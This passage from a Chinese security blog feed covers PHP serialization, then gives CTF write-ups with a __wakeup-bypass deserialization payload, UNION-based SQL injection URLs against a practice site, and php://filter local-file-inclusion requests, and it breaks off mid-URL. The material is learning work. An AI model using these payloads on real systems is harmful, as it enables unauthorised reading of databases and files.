class="keyword">echo</span>  $serialized_data;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">4</span>:&#123;i:<span class="number">0</span>;s:<span class="number">4</span>:<span class="string">"name"</span>;i:<span class="number">1</span>;s:<span class="number">3</span>:<span class="string">"age"</span>;i:<span class="number">2</span>;i:<span class="number">66</span>;i:<span class="number">3</span>;i:<span class="number">233</span>;&#125;</span><br></pre></td></tr></table></figure><hr><p>例2<strong>（对象）</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> $name;</span><br><span class="line"> <span class="keyword">public</span> $age;</span><br><span class="line"> <span class="keyword">public</span> $gender;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age,$gender)</span></span>&#123;        <span class="comment">//_construct：创建对象时初始化</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;gender = $gender;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">$man=<span class="keyword">new</span> man(<span class="string">'Alice'</span>,<span class="number">20</span>,<span class="string">'female'</span>);</span><br><span class="line">var_dump(serialize($man));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">string(<span class="number">78</span>) <span class="string">"O:3:"</span>man<span class="string">":3:&#123;s:4:"</span>name<span class="string">";s:5:"</span>Alice<span class="string">";s:3:"</span>age<span class="string">";i:20;s:6:"</span>gender<span class="string">";s:6:"</span>female<span class="string">";&#125;"</span></span><br></pre></td></tr></table></figure><hr><p>下面是一个例子，给出了相关格式字符的含义：<br><img src="https://s2.ax1x.com/2020/02/21/3ueQ3j.png" alt="3ueQ3j.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">- test类中定义了三个属性（<span class="keyword">private</span>：$flag、<span class="keyword">protected</span>:$test、<span class="keyword">public</span>:$test1）两个方法(set_flag()给私有属性flag赋值、get_flag()获取私有属性flag);</span><br><span class="line"></span><br><span class="line">- $object=<span class="keyword">new</span> test();  <span class="comment">//创建对象</span></span><br><span class="line">- $object-&gt;set_flag(<span class="string">'Active'</span>);  <span class="comment">//创建的对象调用set_flag()方法，对flag赋值</span></span><br><span class="line">- $data=serialize($object);  <span class="comment">//对该对象序列化</span></span><br><span class="line"></span><br><span class="line">- 序列化时只序列化属性,不序列化方法；</span><br><span class="line">    </span><br><span class="line">- testflag(属性名，私有属性只属于test类，所以在前面加上了test类名，后跟属性名flag；</span><br><span class="line">           </span><br><span class="line">- php里默认在testflag首尾分别加了\<span class="number">0</span>，即\<span class="number">0</span>testflag\<span class="number">0</span>，所以长度为<span class="number">10</span>；)</span><br><span class="line">- $flag的值本来是“Inactive”，通过$obiect-&gt;set_flag(<span class="string">'Active'</span>)改为了<span class="string">'Active'</span>所以属性值为<span class="number">6</span>个字符长度；</span><br><span class="line">    </span><br><span class="line">- 受保护的属性即<span class="keyword">protected</span>，在其属性名前要加‘*’，即*test；</span><br></pre></td></tr></table></figure><hr><h1 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h1><p>unserialize（）是将序列化的数据反向重新构建为php中原数据类型和结构。<br><strong>数组变量</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="string">'name'</span>, <span class="string">'age'</span>, <span class="number">66</span>,<span class="number">233</span>);</span><br><span class="line">$serialized_data = serialize($arr);</span><br><span class="line"><span class="comment">#echo  $serialized_data;</span></span><br><span class="line">$unserialized_data = unserialize($serialized_data);</span><br><span class="line"><span class="comment">#print_r($unserialized_data);#print_r() 函数用于打印变量，以更容易理解的形式展示。</span></span><br><span class="line"> var_dump($unserialized_data);<span class="comment">#var_dump() 函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">4</span>) &#123;</span><br><span class="line">  [<span class="number">0</span>]=&gt;</span><br><span class="line">  string(<span class="number">4</span>) <span class="string">"name"</span></span><br><span class="line">  [<span class="number">1</span>]=&gt;</span><br><span class="line">  string(<span class="number">3</span>) <span class="string">"age"</span></span><br><span class="line">  [<span class="number">2</span>]=&gt;</span><br><span class="line">  int(<span class="number">66</span>)</span><br><span class="line">  [<span class="number">3</span>]=&gt;</span><br><span class="line">  int(<span class="number">233</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>对象</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">man</span></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> $name;</span><br><span class="line"> <span class="keyword">public</span> $age;</span><br><span class="line"> <span class="keyword">public</span> $gender;</span><br><span class="line"> </span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name,$age,$gender)</span></span>&#123;        <span class="comment">//_construct：创建对象时初始化</span></span><br><span class="line">  <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;age = $age;</span><br><span class="line">  <span class="keyword">$this</span>-&gt;gender = $gender;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$man=new man('Alice',20,'female');</span></span><br><span class="line"><span class="comment">#var_dump(serialize($man));</span></span><br><span class="line">$man=<span class="string">'O:3:"man":3:&#123;s:4:"name";s:5:"Alice";s:3:"age";i:20;s:6:"gender";s:6:"female";&#125;'</span>;</span><br><span class="line">var_dump(unserialize($man));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">object(man)<span class="comment">#1 (3) &#123;</span></span><br><span class="line">  [<span class="string">"name"</span>]=&gt;</span><br><span class="line">  string(<span class="number">5</span>) <span class="string">"Alice"</span></span><br><span class="line">  [<span class="string">"age"</span>]=&gt;</span><br><span class="line">  int(<span class="number">20</span>)</span><br><span class="line">  [<span class="string">"gender"</span>]=&gt;</span><br><span class="line">  string(<span class="number">6</span>) <span class="string">"female"</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><p>需要满足<strong>两个条件</strong>：</p><ul><li>PHP中有可以利用的类并且类中有可利用的magic函数以’__’开头</li><li>unserialize()函数的参数可控（则可以传入构造的字符串实现攻击）</li></ul><p>关于<a href="https://singlemindedt.github.io/2020/02/13/Magic函数/">magic Methods（魔术函数）</a></p><p>相关题目<a href="https://singlemindedt.github.io/2020/02/13/unserialize3/">unserialize3</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;序列化&quot;&gt;&lt;a href=&quot;#序列化&quot; class=&quot;headerlink&quot; title=&quot;序列化&quot;&gt;&lt;/a&gt;序列化&lt;/h1&gt;&lt;p&gt;serialize（）是将程序中对象的状态信息转换为可存储形式的过程（一般为字符串）&lt;br&gt;例1&lt;strong&gt;(数组变量)&lt;/st
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>unserialize3</title>
    <link href="https://singlemindedt.github.io/2020/02/13/unserialize3/"/>
    <id>https://singlemindedt.github.io/2020/02/13/unserialize3/</id>
    <published>2020-02-13T07:26:35.000Z</published>
    <updated>2020-02-25T14:29:30.815Z</updated>
    
    <content type="html"><![CDATA[<p>根据题目及下面的代码：<br><img src="https://s2.ax1x.com/2020/02/13/1Lw8Ds.png" alt="1Lw8Ds.png"><br>定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变量序列化。<br>根据？code= 猜测可能为将序列化结果输入在?code=后POST请求；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">xctf</span></span>&#123; </span><br><span class="line"><span class="keyword">public</span> $flag = <span class="string">'111'</span>;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">exit</span>(<span class="string">'bad requests'</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=<span class="keyword">new</span> xctf();</span><br><span class="line"><span class="keyword">print</span>(serialize($a));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>运行结果:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">4</span>:<span class="string">"xctf"</span>:<span class="number">1</span>:&#123;s:<span class="number">4</span>:<span class="string">"flag"</span>;s:<span class="number">3</span>:<span class="string">"111"</span>;&#125;</span><br></pre></td></tr></table></figure><p>将此结构键入，会得到“bad requests”，并推出脚本,即执行了_wakeup()。因此应想办法绕过_wakeup();<br><strong><strong>wakeup()执行漏洞：一个字符串或对象被序列化后，如果其属性被修改，对象属性个数的值大于真实个数的属性时，则不会执行</strong>wakeup()函数</strong><br>payload:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://111.198.29.45:30964/?code=O:4:<span class="number">%22</span>xctf<span class="number">%22</span>:3:&#123;s:4:<span class="number">%22</span>flag<span class="number">%22</span>;s:3:<span class="number">%22111</span><span class="number">%22</span>;&#125;即只需要将属性改为大于现属性数即可；</span><br></pre></td></tr></table></figure><p>得到结果：</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">the answer <span class="keyword">is</span> : <span class="type">cyberpeace</span>&#123;<span class="number">4</span>ca0babcfe2c461d7b7dafca84b009bb&#125;</span><br></pre></td></tr></table></figure><p>关于<a href="https://singlemindedt.github.io/2020/02/13/PHP序列化与发序列化/">PHP序列化</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;根据题目及下面的代码：&lt;br&gt;&lt;img src=&quot;https://s2.ax1x.com/2020/02/13/1Lw8Ds.png&quot; alt=&quot;1Lw8Ds.png&quot;&gt;&lt;br&gt;定义了类xctf，其中有flag变量，并调用了_wakeup()，则考虑实例化xctf类并将其变
      
    
    </summary>
    
    
      <category term="PHP" scheme="https://singlemindedt.github.io/tags/PHP/"/>
    
      <category term="攻防世界" scheme="https://singlemindedt.github.io/tags/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/"/>
    
  </entry>
  
  <entry>
    <title>新年打卡</title>
    <link href="https://singlemindedt.github.io/2020/01/01/2020-1-1-diary/"/>
    <id>https://singlemindedt.github.io/2020/01/01/2020-1-1-diary/</id>
    <published>2020-01-01T00:00:00.000Z</published>
    <updated>2020-01-01T00:21:46.862Z</updated>
    
    <content type="html"><![CDATA[<p>大清早各种刷，然后自己也想纪念一下下😂<br>不知不觉一年又过去了，回顾这一年，似乎挺浪233，……<br>e,回来再补！<br>先复习先复习🏃</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;大清早各种刷，然后自己也想纪念一下下😂&lt;br&gt;不知不觉一年又过去了，回顾这一年，似乎挺浪233，……&lt;br&gt;e,回来再补！&lt;br&gt;先复习先复习🏃&lt;/p&gt;

      
    
    </summary>
    
      <category term="summary" scheme="https://singlemindedt.github.io/categories/summary/"/>
    
    
      <category term="Diary" scheme="https://singlemindedt.github.io/tags/Diary/"/>
    
  </entry>
  
  <entry>
    <title>cryptography</title>
    <link href="https://singlemindedt.github.io/2019/12/31/cryptography/"/>
    <id>https://singlemindedt.github.io/2019/12/31/cryptography/</id>
    <published>2019-12-31T01:22:54.000Z</published>
    <updated>2020-01-01T05:15:46.014Z</updated>
    
    <content type="html"><![CDATA[<p><strong>科克霍夫原则</strong>：密码系统的安全性不应该取决于不易改变的算法，而应<strong>取决于可随时改变的密钥</strong>.</p><p><strong>密码体制的分类：</strong></p><p>§<strong>对称**</strong>密码体制**<br>•<strong>序列密码</strong>(流密码)<br>•<strong>分组密码</strong><br>§<strong>公钥密**</strong>码体制<strong><strong>/</strong></strong>非对称密码体制**</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;strong&gt;科克霍夫原则&lt;/strong&gt;：密码系统的安全性不应该取决于不易改变的算法，而应&lt;strong&gt;取决于可随时改变的密钥&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;密码体制的分类：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;§&lt;strong&gt;对称**&lt;/stro
      
    
    </summary>
    
      <category term="summary" scheme="https://singlemindedt.github.io/categories/summary/"/>
    
    
      <category term="notes" scheme="https://singlemindedt.github.io/tags/notes/"/>
    
  </entry>
  
  <entry>
    <title>hackme</title>
    <link href="https://singlemindedt.github.io/2019/12/29/hackme/"/>
    <id>https://singlemindedt.github.io/2019/12/29/hackme/</id>
    <published>2019-12-28T16:00:00.000Z</published>
    <updated>2019-12-30T09:26:10.149Z</updated>
    
    <content type="html"><![CDATA[<p>[TOC]</p><h1 id="hackme"><a href="#hackme" class="headerlink" title="hackme"></a>hackme</h1><hr><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h2><p>直接提交描述即可；</p><hr><h2 id="Corgi-can-fly"><a href="#Corgi-can-fly" class="headerlink" title="Corgi can fly"></a>Corgi can fly</h2><h3 id="实际操作："><a href="#实际操作：" class="headerlink" title="实际操作："></a>实际操作：</h3><p>提示使用stegsolve,得到二维码，扫描得到flag</p><p><img src="https://s2.ax1x.com/2019/12/30/lMTCAH.png" alt="lMTCAH.png"></p><hr><h2 id="Television"><a href="#Television" class="headerlink" title="Television"></a>Television</h2><h3 id="实际操作：-1"><a href="#实际操作：-1" class="headerlink" title="实际操作："></a>实际操作：</h3><p>将图片拖入winhex,搜索关键字flag<br><img src="https://s2.ax1x.com/2019/12/30/lMoznO.png" alt="lMoznO.png"></p><hr><h2 id="Meow"><a href="#Meow" class="headerlink" title="Meow"></a>Meow</h2><h3 id="实际操作：-2"><a href="#实际操作：-2" class="headerlink" title="实际操作："></a>实际操作：</h3><p>利用foremost meow.png提取，得到一个png和一个zip</p><p><img src="https://s2.ax1x.com/2019/12/30/lMoX1x.png" alt="lMoX1x.png"></p><p>打开zip里面有加密的flag还有一张png,</p><p>  仔细观察可以发现两个压缩包内png的crc32 值一样. 故用明文攻击，可以使用Advanced Zip Password Recovery来进行破解；这里我们用pkcrack:</p><ul><li><p>原理：ZIP明文攻击就是利用已知文件找加密密钥，利用密钥来解锁其它加密文件，因为ZIP压缩包里的所有文件都是使用同一个加密密钥来加密的。</p></li><li><p>执行如下命令：</p></li></ul><p><img src="https://s2.ax1x.com/2019/12/30/lMoHAJ.png" alt="lMoHAJ.png"></p><hr><h2 id="Where-is-flag"><a href="#Where-is-flag" class="headerlink" title="Where is flag"></a>Where is flag</h2><h3 id="问题分析："><a href="#问题分析：" class="headerlink" title="问题分析："></a>问题分析：</h3><p>给出一串字符：<br><img src="https://s2.ax1x.com/2019/12/30/lMTSBD.png" alt="lMTSBD.png"></p><p>Flag应该就在这里面，提示正则：cat flag |grep -oP “FLAG{[0-9a-zA-Z]+}”</p><p><img src="https://s2.ax1x.com/2019/12/30/lMTpHe.png" alt="lMTpHe.png"><br>得到flag。</p><hr><h2 id="Encoder"><a href="#Encoder" class="headerlink" title="Encoder"></a>Encoder</h2><h3 id="问题描述："><a href="#问题描述：" class="headerlink" title="问题描述："></a>问题描述：</h3><p>Can you decode this?<br>下载解压得到 encoder.py 和 flag.enc；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rot13</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.translate(string.maketrans(string.uppercase + string.lowercase,</span><br><span class="line">        string.uppercase[<span class="number">13</span>:] + string.uppercase[:<span class="number">13</span>] +</span><br><span class="line">        string.lowercase[<span class="number">13</span>:] + string.lowercase[:<span class="number">13</span>]))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">base64</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">''</span>.join(s.encode(<span class="string">'base64'</span>).split())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.encode(<span class="string">'hex'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upsidedown</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> s.translate(string.maketrans(string.uppercase + string.lowercase,</span><br><span class="line">        string.lowercase + string.uppercase))</span><br><span class="line"></span><br><span class="line">flag = <span class="string">'FLAG&#123;.....................&#125;'</span>  <span class="comment"># try to recover flag</span></span><br><span class="line"></span><br><span class="line">E = (rot13, base64, hex, upsidedown)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(random.randint(<span class="number">30</span>, <span class="number">50</span>)):</span><br><span class="line">    <span class="keyword">print</span> i</span><br><span class="line">    c = random.randint(<span class="number">0</span>, len(E) - <span class="number">1</span>)</span><br><span class="line">    flag = <span class="string">'%d%s'</span> % (c, E[c](flag))</span><br><span class="line"></span><br><span class="line">open(<span class="string">'flag.enc'</span>, <span class="string">'w'</span>).write(flag)</span><br></pre></td></tr></table></figure><p>可以明显看到c的值就在密文开头：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> binascii <span class="keyword">import</span> unhexlify</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unrot13</span><span class="params">(s)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> s.translate(str.maketrans(string.ascii_uppercase[<span class="number">13</span>:] + string.ascii_uppercase[:<span class="number">13</span>] +</span><br><span class="line">                                         string.ascii_lowercase[<span class="number">13</span>:] + string.ascii_lowercase[:<span class="number">13</span>],</span><br><span class="line">                                         string.ascii_uppercase + string.ascii_lowercase))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unupsidedown</span><span class="params">(s)</span>:</span></span><br><span class="line">     <span class="keyword">return</span> s.translate(str.maketrans(string.ascii_lowercase + string.ascii_uppercase,</span><br><span class="line">                                         string.ascii_uppercase + string.ascii_lowercase))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unbase64</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> b64decode(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">unhex</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> unhexlify(s).decode()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'./flag.enc'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">E = (unrot13, unbase64, unhex, unupsidedown)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">    c, data = int(data[<span class="number">0</span>]), data[<span class="number">1</span>:]</span><br><span class="line">    data = E[c](data)</span><br><span class="line">    <span class="keyword">if</span> data.startswith(<span class="string">'FLAG'</span>):</span><br><span class="line">        print(data)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>运算结果如下，得到flag：</p><p><img src="https://s2.ax1x.com/2019/12/30/lMTPNd.png" alt="lMTPNd.png"></p><hr><h2 id="Pusheen-txt"><a href="#Pusheen-txt" class="headerlink" title="Pusheen.txt"></a>Pusheen.txt</h2><h3 id="问题描述：-1"><a href="#问题描述：-1" class="headerlink" title="问题描述："></a>问题描述：</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Do</span> you think pusheen <span class="keyword">is</span> cute?</span><br></pre></td></tr></table></figure><p>下载解压得到 pusheen.txt, 里面是一堆不可名状的字符画<br>字符两种, 把这个序列转成二进制, 再转ASCII, 就得到了 flag</p><p>(白为0，黑为1，转化为ascll)<br><img src="https://s2.ax1x.com/2019/12/30/lMojc6.png" alt="lMojc6.png"></p><hr><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><hr><h2 id="hide-and-seek"><a href="#hide-and-seek" class="headerlink" title="hide and seek"></a>hide and seek</h2><h3 id="问题描述：-2"><a href="#问题描述：-2" class="headerlink" title="问题描述："></a>问题描述：</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Can you see <span class="keyword">me</span>? I<span class="comment">'m so close to you but you can't see me.</span></span><br></pre></td></tr></table></figure><h3 id="实际操作：-3"><a href="#实际操作：-3" class="headerlink" title="实际操作："></a>实际操作：</h3><p>查看源码：</p><p><a href="https://imgchr.com/i/lMTmDS" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/12/30/lMTmDS.md.png" alt="lMTmDS.md.png"></a></p><p>或者直接查看控制台（Console）里面有张二维码，扫一下得到flag<br>此处做一标记orz，扫二维码的确得到了flag，但是不是这一题的hhhhh…,提交发现是homepage的。</p><hr><h2 id="Guestbook"><a href="#Guestbook" class="headerlink" title="Guestbook"></a>Guestbook</h2><h3 id="问题描述：-3"><a href="#问题描述：-3" class="headerlink" title="问题描述："></a>问题描述：</h3><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">This guestbook sucks. sqlmap <span class="keyword">is</span> your <span class="keyword">friend</span>.</span><br></pre></td></tr></table></figure><h3 id="实际操作：-4"><a href="#实际操作：-4" class="headerlink" title="实际操作："></a>实际操作：</h3><ul><li>提示用sqlmap，就是sql注入了，手动注入一下：<figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=<span class="number">0</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure></li></ul><p><img src="https://s2.ax1x.com/2019/12/30/lMTi4A.png" alt="lMTi4A.png"></p><ul><li><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=<span class="number">0</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(table_name)<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()</span><br></pre></td></tr></table></figure></li></ul><p>看到flag表<br><img src="https://s2.ax1x.com/2019/12/30/lMTk9I.png" alt="lMTk9I.png"></p><ul><li><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://hackme.inndy.tw/gb/?mod=read&amp;id=<span class="number">0</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,<span class="number">2</span>,<span class="number">3</span>,group_concat(flag)<span class="symbol">%20</span>from<span class="symbol">%20</span>flag</span><br></pre></td></tr></table></figure></li></ul><p>查询所有数据<br><img src="https://s2.ax1x.com/2019/12/30/lMTVjf.png" alt="lMTVjf.png"></p><hr><h2 id="LFI"><a href="#LFI" class="headerlink" title="LFI"></a>LFI</h2><h3 id="知识补充："><a href="#知识补充：" class="headerlink" title="知识补充："></a>知识补充：</h3><p>  php://filter是PHP语言中特有的协议流，作用是作为一个“中间流”来处理其他流。比如，我们可以用如下一行代码将POST内容转换成base64编码并输出：<br>readfile(“php://filter/read=convert.base64-encode/resource=php://input”);</p><h3 id="实际操作：-5"><a href="#实际操作：-5" class="headerlink" title="实际操作："></a>实际操作：</h3><p>此题url为：<a href="https://hackme.inndy.tw/lfi/?page=pages/index" target="_blank" rel="noopener">https://hackme.inndy.tw/lfi/?page=pages/index</a><br>结合题目提示，应该为读文件；</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">读：https:<span class="regexp">//</span>hackme.inndy.tw<span class="regexp">/lfi/</span>?page=php:<span class="regexp">//</span>filter<span class="regexp">/read=convert.base64-encode/</span>resource=pages<span class="regexp">/flag</span></span><br></pre></td></tr></table></figure><p>得到一串base64<br><img src="https://s2.ax1x.com/2019/12/30/lMobN9.png" alt="lMobN9.png"><br>解码得到：Can you read the flag<?php require('config.php'); ?>?<br>继续读config.php</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:<span class="regexp">//</span>hackme.inndy.tw<span class="regexp">/lfi/</span>?page=php:<span class="regexp">//</span>filter<span 